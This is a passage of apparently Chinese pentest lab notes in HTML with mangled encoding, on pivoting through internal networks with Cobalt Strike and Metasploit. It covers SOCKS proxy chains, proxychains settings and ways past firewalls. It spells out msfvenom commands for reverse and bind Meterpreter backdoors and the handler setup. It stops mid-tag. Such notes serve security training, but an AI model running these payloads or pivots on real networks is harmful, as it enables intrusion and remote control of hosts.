        <content type="html"><![CDATA[<h2 id="ä»£ç†"><a href="#ä»£ç†" class="headerlink" title="ä»£ç†"></a>ä»£ç†</h2><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25663185/1734597391301-ac95713a-2f99-4b91-8409-1f64d33d30fe.png"></p><p>NAT        139.0æ¨¡æ‹Ÿå‡ºç½‘æ®µ</p><p>vmware2    2.0 æ¨¡æ‹Ÿå†…ç½‘æ®µ1</p><p>vmware3    3.0 æ¨¡æ‹Ÿå†…ç½‘æ®µ2</p><p>vmware4    4.0 æ¨¡æ‹Ÿå†…ç½‘æ®µ3</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25663185/1734597978005-f727b176-c021-4545-aa52-05acb2da6765.png"></p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25663185/1734598064353-94352ced-4af6-4e63-822a-1313d6f82e25.png"></p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25663185/1734598092118-2d1bc42a-ca41-4ea6-99ee-66756d6cbf82.png"></p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25663185/1734598096983-bfdd30d4-e973-4d93-b742-52c713dd1891.png"></p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25663185/1734598101499-a9b79041-61d0-464c-8fa1-8f098dadbd1b.png"></p><p>æœåŠ¡å™¨éœ€è¦æŠŠç½‘å¡2ï¼Œ3ï¼Œ4å…¨éƒ¨ç¦ç”¨</p><h3 id="csæ¼”ç¤º"><a href="#csæ¼”ç¤º" class="headerlink" title="csæ¼”ç¤º"></a>csæ¼”ç¤º</h3><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25663185/1734614811566-ac2a9254-43f3-4fef-bf15-93ddc98142a6.png"></p><p>ä¸Šçº¿</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25663185/1734612073706-d94e2943-110f-42f9-8a2a-599879f86e0a.png"></p><p>ä»£ç†</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25663185/1734614855176-a830e504-b486-440c-8188-c10d28782a45.png"></p><p>å»ºç«‹èŠ‚ç‚¹</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25663185/1734614866336-3dd78c9a-7b24-4492-80f8-819403627ed9.png"></p><p>æ³¨æ„ç«¯å£æ˜¯csæœåŠ¡å™¨ç«¯å£</p><p>ç„¶åä»£ç†æœåŠ¡å™¨</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25663185/1734612305228-2ac125e2-0372-471d-9785-c805929ac90f.png"></p><p>é€‰4aæ‰©å±•</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25663185/1734614953855-ca5d29c6-9164-4177-bc3e-9f4176809892.png"></p><p>æµ‹è¯•ä¸€ä¸‹</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25663185/1734614969731-8fd92125-3478-43de-8a92-317e7b9c845d.png"></p><p>å†åŠ è§„åˆ™</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25663185/1734612549574-0b085cb1-400e-4e18-a90d-e03cc0efdb83.png"></p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25663185/1734615005316-051de770-2f6a-4231-9388-208b2bbd2dbc.png"></p><p>æµ‹è¯•æˆåŠŸ</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25663185/1734612811637-bc50caec-f473-409f-9292-bd35bab8ed02.png"></p><p>è¿™ä¸ªæ—¶å€™åœ¨æ”»å‡»æœºwinä¸Šfscanä¸€ä¸‹</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25663185/1734615081496-ebe95fa7-bc8e-4f15-b385-fd545fd27ecb.png"></p><p>ç°åœ¨å¼€å§‹å¾€192.168.2.22ç§»åŠ¨</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25663185/1734616003616-e4603ac7-4a0d-4abf-a50c-376f1e26fa46.png"></p><p>çœ‹åˆ°æ²¡æœ‰ip<img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25663185/1734616034675-7b1a3e99-30a5-47ac-a0b5-4c18daa023f4.png"></p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25663185/1734616389453-8bb0c833-b9f0-4664-a031-c699ddc690b6.png"></p><p>ä¼ åˆ°sqlæœºå™¨ä¸Šï¼Œç„¶åsqlæœºå™¨è¿è¡Œexeï¼Œ</p><p>å‘ç°sqlæœºå™¨4444ç«¯å£ç›‘å¬</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25663185/1734616603320-93ed0c06-197e-4045-a093-3516b4d54da8.png"></p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25663185/1734616670409-6291dd85-1e84-48c4-96fd-f78b456c3003.png"></p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25663185/1734616691591-2265172d-08c0-4ebc-b48d-1bde4f7451ba.png"></p><p>åœ¨2.22æœåŠ¡å™¨ä¸Šå†æ¥ä¸€æ¬¡socketä»£ç†ï¼Œè¿˜æ˜¯c2æœåŠ¡å™¨çš„ip</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25663185/1734617230971-8319e350-1271-4016-baf6-b56fb5a6e9ea.png"></p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25663185/1734617267483-d3c43f8e-18af-49de-8573-16936cebd216.png"></p><p>æ”»å‡»æœºèƒ½è®¿é—®åˆ°</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25663185/1734617302027-75a0e459-221c-44b4-bbf7-cce596ae57f1.png"></p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25663185/1734617388779-3b1f8323-ffd8-4558-a3d8-4c79735eaf26.png"></p><p>ç„¶åä¹Ÿæ˜¯ä¸èƒ½åå‘ï¼Œæ¥ç€æ­£å‘é“¾æ¥</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25663185/1734618095091-1fdf9d21-8ab0-45ec-8b9e-dbafeaffbcbe.png"></p><p>ç„¶åè¦é€š4.22ï¼Œå°±è¦åœ¨3.22çš„åŸºç¡€ä¸Šåœ¨sock</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25663185/1734618208549-c93a9757-2794-49fd-adbb-01a076e59d61.png"></p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25663185/1734618258339-4b7a43d9-f093-4bd4-82de-8a892d89db53.png"></p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25663185/1734618361704-e51ec4d8-e9ec-4950-818e-1c9bc45d96dd.png"></p><p>æˆåŠŸ</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25663185/1734618846346-eb6cc5b8-a647-490f-80fd-a412260fe218.png"> </p><h3 id="msfæ¼”ç¤º"><a href="#msfæ¼”ç¤º" class="headerlink" title="msfæ¼”ç¤º"></a>msfæ¼”ç¤º</h3><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25663185/1734750098640-8cd02866-23f4-44b0-a6bb-813b38439318.png"></p><p>renameæˆ3333.exe</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25663185/1734750758111-764dbce3-bfe2-4765-8399-3b013439d0d1.png"></p><p>msfé…ç½®ä¸€ä¸‹æ”»å‡»exe</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25663185/1734750955349-24d3b6b9-3917-4d3a-a65e-b19eb5904141.png"></p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25663185/1734751067472-f4e0de94-29ad-4601-bfd4-beee7dd694db.png"></p><p>ä¸Šçº¿</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25663185/1734751104085-1291c6be-4e5b-4817-a297-bb6cebabf7ed.png"></p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25663185/1734751699344-267f2b77-094b-4099-a63b-ddec156d034e.png"></p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25663185/1734751588615-c218bf9d-ef2f-4a7a-8eb1-c52561519683.png"></p><p>è·å–è·¯ç”±ï¼Œçœ‹åˆ°2ç½‘æ®µè¢«æ·»åŠ </p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25663185/1734751155888-ded59b85-a070-45f3-a47e-3e9159089d5e.png"></p><p>åˆ›å»ºsocksèŠ‚ç‚¹</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25663185/1734751372819-00a56ca6-d302-4e35-be1a-b5522528798d.png"></p><p>ç»‘å®š4444ç«¯å£</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25663185/1734751386773-c633237c-d0f5-4129-82fc-43e22d6cdd79.png"></p><p>jobå¯ä»¥æŸ¥çœ‹ï¼Œæ­¤æ—¶proxiferä¹Ÿå¯ä»¥è¿ï¼Œä½†æ˜¯ä»‹ç»proxychains</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25663185/1734751425674-154c14b8-4ac5-4064-8e72-756f56ae4be8.png"></p><p>ä¿®æ”¹ä¸‹é…ç½®æ–‡ä»¶</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25663185/1734751938613-0c33a4ab-adae-4ad5-af07-2f27af08d38d.png"></p><p>å¯ä»¥çœ‹åˆ°è®¿é—®åˆ°äº†2.22çš„webæœåŠ¡</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25663185/1734752140181-0f13faf7-3ba1-4c5b-917a-b7e46d9dbff7.png"></p><p>è¿™é‡Œæ³¨æ„nmapæ‰«ä¸å‡ºæ¥ï¼Œå› ä¸ºåè®®é—®é¢˜ï¼Œsocksä»£ç†ä¸å‡ºæ¥</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25663185/1734752332292-83297104-3015-4e39-b6e3-00160500a56e.png"></p><p>åœ¨æ­¤ä¹‹åçš„å› ä¸ºæ— æ³•ç›´æ¥è®¿é—®ï¼Œéœ€è¦ç”Ÿæˆæ­£å‘åé—¨</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25663185/1734752529164-5d23a7d4-c89e-460b-bfa1-f67135aaaa3a.png"></p><p>è®¾ç½®æ­£å‘é“¾æ¥</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25663185/1734752728636-85c9205b-86fa-4f49-9d3f-df4fbc59db72.png"></p><p>è®¾ç½®åˆšæ‰æ­£å‘è¦é“¾æ¥çš„ç«¯å£åœ°å€ï¼Œrun</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25663185/1734752825727-062fa586-c3a8-43de-94ef-0fceb221fe9e.png"></p><p>å†è®¾ç½®ä»£ç†ï¼Œbackgroundè¿”å›ï¼Œç”¨ä»£ç†æ¨¡å—ï¼Œè¿™é‡Œæ³¨æ„åœ¨è®¾ç½®ä¹‹å‰æ³¨æ„è®¾ç½®çš„æ˜¯session2ï¼Œå°±è¦åœ¨sessions 2ä¸­æŠŠè·¯ç”±ä¿¡æ¯æ·»åŠ </p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25663185/1734753072321-60f39b33-daf7-40e8-9ee4-d789cfaeb258.png"></p><p>æ“ä½œä¹‹åï¼Œåœ¨sessions2ä¸­çœ‹åˆ°3ç½‘æ®µè¢«æ·»åŠ äº†</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25663185/1734753109377-51cb82ea-fd7f-452e-8541-320ffaeb7940.png"></p><p>å†æ·»åŠ ä»£ç†</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25663185/1734753163289-543a97f2-d179-46ff-988f-5c3615893c6d.png"></p><p>å¯ä»¥è®¿é—®åˆ°3.22</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25663185/1734753326387-7897dcd2-1a8c-41eb-8e95-2940e3dbb76e.png"></p><p>åŒæ ·çš„æ“ä½œ</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25663185/1734753459262-2aa835fe-215d-4ff7-b947-fbae4f8f91fa.png"></p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25663185/1734753839783-a9a7b599-778f-4a18-9da9-109adecd4159.png"></p><p>æ·»åŠ è·¯ç”±</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25663185/1734753905250-ba4a8a0c-ecb7-4762-a163-49072f3c6356.png"></p><p>ç„¶åè®¾ç½®ä»£ç†æ¨¡å—</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25663185/1734754057908-aacbe4aa-4b2f-4ace-817b-67e32618b690.png"></p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25663185/1734754042506-3924a55e-efc6-4d3a-bd8b-20f02f0e7063.png"></p><p>æµ‹è¯•</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25663185/1734754107964-950347ef-5386-473c-a5d8-fe00df8211fe.png"></p><p>åŒç†å†ä¸Šçº¿4.22ï¼Œæ­£å‘çš„æ—¶å€™å¯ä»¥ç”¨ä¸€ä¸ªexe</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25663185/1734754329683-27a4f6e3-d4b7-4cf6-9b3b-82959fc9403a.png"></p><p>è¿™é‡Œè®¾ç½®ä¸€æ ·ï¼Œä¸­é—´ä»£ç†å¡äº†ä¸€æ¬¡é‡æ–°æ­äº†ä¸€æ¬¡ï¼Œåˆä»4567ä¼šè¯å¼€å§‹æ­å»º</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25663185/1734755548263-b9db2142-8a8f-4e88-b54e-f6c91ad6141f.png"></p><h3 id="SockSé…ç½®-ç½‘ç»œä¸å¯è¾¾-é€šè®¯è§£å†³"><a href="#SockSé…ç½®-ç½‘ç»œä¸å¯è¾¾-é€šè®¯è§£å†³" class="headerlink" title="SockSé…ç½®-ç½‘ç»œä¸å¯è¾¾-é€šè®¯è§£å†³"></a>SockSé…ç½®-ç½‘ç»œä¸å¯è¾¾-é€šè®¯è§£å†³</h3><p>è§£å†³ï¼šä¿¡æ¯æ”¶é›†æ‰“ç‚¹å’Œæ¼æ´åˆ©ç”¨éƒ¨åˆ†</p><p>æ³¨æ„ï¼šé…ç½®è¿æ¥IPä¸ºC2æœåŠ¡å™¨IP</p><p>å·¥å…·ï¼šProxifier Proxychainsç­‰</p><h4 id="Proxifierä½¿ç”¨ï¼š"><a href="#Proxifierä½¿ç”¨ï¼š" class="headerlink" title="Proxifierä½¿ç”¨ï¼š"></a>Proxifierä½¿ç”¨ï¼š</h4><p>å›¾å½¢åŒ–æ“ä½œ</p><h4 id="Proxychainsä½¿ç”¨ï¼š"><a href="#Proxychainsä½¿ç”¨ï¼š" class="headerlink" title="Proxychainsä½¿ç”¨ï¼š"></a>Proxychainsä½¿ç”¨ï¼š</h4><p>åŠ å…¥ä¿®æ”¹é…ç½®ï¼š &#x2F;etc&#x2F;proxychains4.conf</p><p>æœ€ä¸‹é¢</p><p>socks5 127.0.0.1 8989</p><p>å¦‚æœæ˜¯4aå°±æ˜¯</p><p>socks4a 127.0.0.1 8989 </p><p>è°ƒç”¨åŠ è½½æµ‹è¯•ï¼š proxychains4 curl <a href="http://192.168.2.22/">http://192.168.2.22</a></p><p>C2å¹³å°ï¼šMSF&#x2F;CS&#x2F;Sliver&#x2F;Viperç­‰</p><p>å®ç°æ­¥éª¤ï¼š</p><p>1ã€åœ¨è¢«æ§æœºå™¨ä¸Šè·å–ä¸‹ä¸€çº§ç½‘æ®µ</p><p>2ã€åœ¨è¢«æ§åŠå…¶ä¸Šå»ºç«‹SockSèŠ‚ç‚¹</p><p>3ã€åœ¨å·¥å…·ä¸Šé…ç½®è¿æ¥å±æ€§å’Œè§„åˆ™è§¦å‘</p><h3 id="æ­£åå‘ç›‘å¬-ç½‘ç»œä¸å¯è¾¾-C2ä¸Šçº¿"><a href="#æ­£åå‘ç›‘å¬-ç½‘ç»œä¸å¯è¾¾-C2ä¸Šçº¿" class="headerlink" title="æ­£åå‘ç›‘å¬-ç½‘ç»œä¸å¯è¾¾-C2ä¸Šçº¿"></a>æ­£åå‘ç›‘å¬-ç½‘ç»œä¸å¯è¾¾-C2ä¸Šçº¿</h3><p>C2å¹³å°ï¼šMSF&#x2F;CS&#x2F;Sliver&#x2F;Viperç­‰</p><p>å®ç°æ­¥éª¤ï¼š</p><p>åå‘ç›‘å¬å™¨ï¼šreverse</p><p>æ­£å‘ç›‘å¬å™¨ï¼šbindï¼ˆéœ€ä¸»åŠ¨è¿æ¥ï¼‰</p><p>CSæ“ä½œï¼š</p><p>ç›´æ¥-å›¾å½¢åŒ–æ“ä½œ</p><p>MSFæ“ä½œå‘½ä»¤ï¼š</p><h4 id="é…ç½®åå‘ä¸Šçº¿ï¼š"><a href="#é…ç½®åå‘ä¸Šçº¿ï¼š" class="headerlink" title="é…ç½®åå‘ä¸Šçº¿ï¼š"></a>é…ç½®åå‘ä¸Šçº¿ï¼š</h4><p>ç”Ÿäº§çš„åé—¨åœ¨&#x2F;rootç›®å½•ä¸‹</p><p>msfvenom -p windows&#x2F;meterpreter&#x2F;reverse_tcp LHOST&#x3D;192.168.139.141 LPORT&#x3D;3333 -f exe -o msf.exe</p><p>msfconsoleï¼š</p><p>use exploit&#x2F;multi&#x2F;handler</p><p>set payload windows&#x2F;meterpreter&#x2F;reverse_tcp</p><p>show options çœ‹ä¸€ä¸‹è®¾ç½®é€‰é¡¹</p><p>set lhost 0.0.0.0</p><p>set lport 3333</p><p>run</p><h4 id="æŸ¥çœ‹è·¯ç”±è¡¨ï¼š"><a href="#æŸ¥çœ‹è·¯ç”±è¡¨ï¼š" class="headerlink" title="æŸ¥çœ‹è·¯ç”±è¡¨ï¼š"></a>æŸ¥çœ‹è·¯ç”±è¡¨ï¼š</h4><p>run autoroute -p</p><p>run post&#x2F;multi&#x2F;manage&#x2F;autoroute</p><p>æŸ¥çœ‹å®Œè®°å¾—è¾“å…¥backgroundè·³å‡ºä¼šè¯</p><h4 id="åˆ›å»ºsocksèŠ‚ç‚¹ï¼š"><a href="#åˆ›å»ºsocksèŠ‚ç‚¹ï¼š" class="headerlink" title="åˆ›å»ºsocksèŠ‚ç‚¹ï¼š"></a>åˆ›å»ºsocksèŠ‚ç‚¹ï¼š</h4><p>use auxiliary&#x2F;server&#x2F;socks_proxy</p><p>show options</p><p>åªç”¨è®¾ç½®ç‰ˆæœ¬å’Œç«¯å£ï¼ˆé»˜è®¤5ï¼‰</p><p>è®¾ç½®å®Œè¦run</p><h4 id="é…ç½®æ­£å‘ä¸Šçº¿ï¼š"><a href="#é…ç½®æ­£å‘ä¸Šçº¿ï¼š" class="headerlink" title="é…ç½®æ­£å‘ä¸Šçº¿ï¼š"></a>é…ç½®æ­£å‘ä¸Šçº¿ï¼š</h4><p>msfvenom -p windows&#x2F;meterpreter&#x2F;bind_tcp LPORT&#x3D;xx -f exe -o msf.exe</p><p>msfconsole:</p><p>use exploit&#x2F;multi&#x2F;handler</p><p>set payload windows&#x2F;meterpreter&#x2F;bind_tcp</p><p>set rhost xx.xx.xx.xx</p><p>set lport 6666</p><p>run</p><p>ä¸»åŠ¨é“¾æ¥  xx.xx.xx.xxï¼š6666</p><h2 id="é˜²ç«å¢™"><a href="#é˜²ç«å¢™" class="headerlink" title="é˜²ç«å¢™"></a>é˜²ç«å¢™</h2><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25663185/1734768803502-aab59ed0-9d7a-4b0e-b422-e74eb2333609.png"></p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25663185/1734768793189-4b0eab75-a95d-408d-8f8c-9435de96db0f.png"></p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25663185/1734770686286-a22a5e28-7b1e-4811-a860-0bf4d6000785.png"></p><p>å…¨éƒ¨å¯ç”¨</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25663185/1734770783583-242f228f-0b98-48ee-9908-c903367e620a.png"></p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25663185/1734770845216-7383e853-e345-41cc-9464-cc4ddda06faa.png"></p><p>ç»¿è‰²æ˜¯æ”¾è¡Œï¼Œæœªç»¿è‰²æ ‡è¯†ä¸æ”¾è¡Œ</p><p>é˜²ç«å¢™ç­–ç•¥-å…¥ç«™è§„åˆ™&amp;å‡ºç«™è§„åˆ™&amp;è‡ªå®šä¹‰</p><p>1ã€é˜²ç«å¢™é»˜è®¤å…¥ç«™&amp;å‡ºç«™ç­–ç•¥</p><p>2ã€é˜²ç«å¢™è‡ªå®šä¹‰å…¥ç«™&amp;å‡ºç«™ç­–ç•¥</p><p>å†…ç½‘åŸŸé˜²ç«å¢™åŒæ­¥ç­–ç•¥ï¼š</p><p>æ“ä½œï¼šç»„ç­–ç•¥ç®¡ç†-åŸŸ-åˆ›å»ºGPOé“¾æ¥-é˜²ç«å¢™è®¾ç½®</p><p>æ›´æ–°ç­–ç•¥ï¼šå¼ºåˆ¶&amp;å‘½ä»¤&amp;é‡å¯</p><p>å‘½ä»¤ï¼šgpupdate&#x2F;force</p><p>é™åˆ¶ç«¯å£åˆ†ä¸ºï¼š å…¥ç«™é™åˆ¶ç«¯å£ã€å‡ºç«™é™åˆ¶ç«¯å£ã€å‡ºå…¥ç«™å‡é™åˆ¶ç«¯å£ã€‚</p><p>å…¥ç«™é™åˆ¶ç«¯å£ï¼Œå‡ºç«™æœªé™åˆ¶ç«¯å£ï¼Œä½¿ç”¨åå‘è¿æ¥ã€‚</p><p>å‡ºç«™é™åˆ¶ç«¯å£ï¼Œå…¥ç«™æœªé™åˆ¶ç«¯å£ï¼Œä½¿ç”¨æ­£å‘è¿æ¥ã€‚</p><p>å‡ºå…¥ç«™å‡é™åˆ¶ç«¯å£ï¼Œä½¿ç”¨ç«¯å£ç»•è¿‡è¿›è¡Œè¿æ¥ï¼Œå»ºè®®é…åˆåå‘è¿æ¥ã€‚</p><p>é™åˆ¶åè®®åˆ†ä¸ºï¼š</p><p>å…¥ç«™é™åˆ¶ã€å‡ºç«™é™åˆ¶ã€å‡ºå…¥å‡é™åˆ¶ï¼Œé™åˆ¶åˆåˆ†ä¸ºï¼šå•åè®®é™åˆ¶ã€å¤šåè®®é™åˆ¶ã€å…¨éƒ¨é™åˆ¶ã€‚</p><h3 id="å…¥ç«™é™åˆ¶ï¼š"><a href="#å…¥ç«™é™åˆ¶ï¼š" class="headerlink" title="å…¥ç«™é™åˆ¶ï¼š"></a>å…¥ç«™é™åˆ¶ï¼š</h3><p>å•åè®®é™åˆ¶ï¼Œä½¿ç”¨å…¶å®ƒåè®®æˆ–è€…åå‘è¿æ¥ç»•è¿‡ã€‚ï¼ˆéš§é“æŠ€æœ¯ï¼‰</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25663185/1734771145479-35177ec4-3f01-459e-880f-bcb39de47f1a.png">è¿™ç§æƒ…å†µå°±æ˜¯å…ˆåå‘è¿2.11ï¼Œåœ¨æ­£å‘è¿2.22</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25663185/1734771408616-1e293ad7-8f9d-4bcd-94fd-47f58c953cc3.png"></p><p> è¿™ç§æƒ…å†µå› ä¸ºsqlä¸Šæœ‰webæœåŠ¡ï¼Œå¦‚æœè¦è®¿é—®çš„è¯è¿˜éœ€è¦é…ç½®å…¥ç«™è§„åˆ™ã€‚</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25663185/1734771786168-c23e77b4-ea6b-4bb9-92ca-a91663bcd3cd.png"></p><p>æ–°å»º</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25663185/1734771865213-f5fdd4df-6d86-45e3-9dd5-1c01ffdc2e07.png"></p><p>åŠ 80ç«¯å£ä¹‹å</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25663185/1734771968145-0ebe75a6-68b0-4e59-84d5-5a604ad83cc1.png"></p><p>è¿™é‡Œè®©2.22åå‘ç»™2.11ï¼Œæ­¤æ—¶å¯¹è½¬å‘ä¸Šçº¿</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25663185/1734772200601-4dccb3f4-d2b8-4a61-84f8-aa532bb575ff.png"></p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25663185/1734772247956-2fdc01c9-aee3-41ca-9378-7a89315fb25c.png"></p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25663185/1734772327920-3eef69f6-02a2-4a2c-8cbd-089fbd657049.png"></p><p>æ­¤æ—¶å†è®©sql2.22ä¸Šçº¿</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25663185/1734773244500-dbab805e-0793-4fad-864b-43e1b87f5f73.png"></p><p>å¤šåè®®é™åˆ¶ï¼Œä½¿ç”¨æœªè¢«é™åˆ¶çš„åè®®æˆ–è€…åå‘è¿æ¥ç»•è¿‡ã€‚ï¼ˆéš§é“æŠ€æœ¯ï¼‰</p><p>å…¨éƒ¨åè®®é™åˆ¶ï¼Œä½¿ç”¨æ”¾å¼ƒæˆ–è€…åå‘è¿æ¥ç»•è¿‡ï¼Œä½†æ­£å¸¸ä¸ä¼šå°†æ‰€ä»¥åè®®éƒ½å°é—­çš„ã€‚</p><h3 id="å‡ºç«™é™åˆ¶ï¼š"><a href="#å‡ºç«™é™åˆ¶ï¼š" class="headerlink" title="å‡ºç«™é™åˆ¶ï¼š"></a>å‡ºç«™é™åˆ¶ï¼š</h3><p>å‚è€ƒä¸Šé¢ä½¿ç”¨æ­£å‘è¿æ¥ç»•è¿‡ã€‚</p><p>å‡ºå…¥å‡é™åˆ¶ï¼š</p><p>å•åè®®é™åˆ¶ï¼Œä½¿ç”¨å…¶å®ƒåè®®ç»•è¿‡ã€‚ï¼ˆéš§é“æŠ€æœ¯ï¼‰</p><p>å¤šåè®®é™åˆ¶ï¼Œä½¿ç”¨æœªè¢«é™åˆ¶çš„åè®®ç»•è¿‡ã€‚ï¼ˆéš§é“æŠ€æœ¯ï¼‰</p><p>å…¨éƒ¨åè®®é™åˆ¶ï¼Œä½¿ç”¨æ”¾å¼ƒç»•è¿‡ï¼Œä½†æ­£å¸¸ä¸ä¼šå°†æ‰€ä»¥åè®®éƒ½å°é—­çš„ã€‚</p><p>å•å±‚ç›®æ ‡æœºé˜²ç«å¢™å¼€å¯ ä¸Šçº¿è§£å†³æ–¹æ¡ˆï¼š</p><p>1ã€å‘½ä»¤å…³é—­é˜²ç«å¢™</p><p>2ã€åå‘ä¸­è½¬è¿æ¥ä¸Šçº¿</p><p>3ã€åˆ©ç”¨éš§é“æŠ€æœ¯ä¸Šçº¿ï¼ˆè§„åˆ™å†³å®šï¼‰</p><h3 id="å•å±‚è·³æ¿æœºé˜²ç«å¢™å¼€å¯ä¸Šçº¿è§£å†³æ–¹æ¡ˆï¼š"><a href="#å•å±‚è·³æ¿æœºé˜²ç«å¢™å¼€å¯ä¸Šçº¿è§£å†³æ–¹æ¡ˆï¼š" class="headerlink" title="å•å±‚è·³æ¿æœºé˜²ç«å¢™å¼€å¯ä¸Šçº¿è§£å†³æ–¹æ¡ˆï¼š"></a>å•å±‚è·³æ¿æœºé˜²ç«å¢™å¼€å¯ä¸Šçº¿è§£å†³æ–¹æ¡ˆï¼š</h3><p>1ã€å‘½ä»¤å…³é—­é˜²ç«å¢™</p><p>2ã€æ­£å‘ç›‘å¬è¿æ¥ä¸Šçº¿</p><p>3ã€åˆ©ç”¨éš§é“æŠ€æœ¯ä¸Šçº¿ï¼ˆè§„åˆ™å†³å®šï¼‰</p><h3 id="åŒå±‚é˜²ç«å¢™å¼€å¯ä¸Šçº¿è§£å†³æ–¹æ¡ˆï¼š"><a 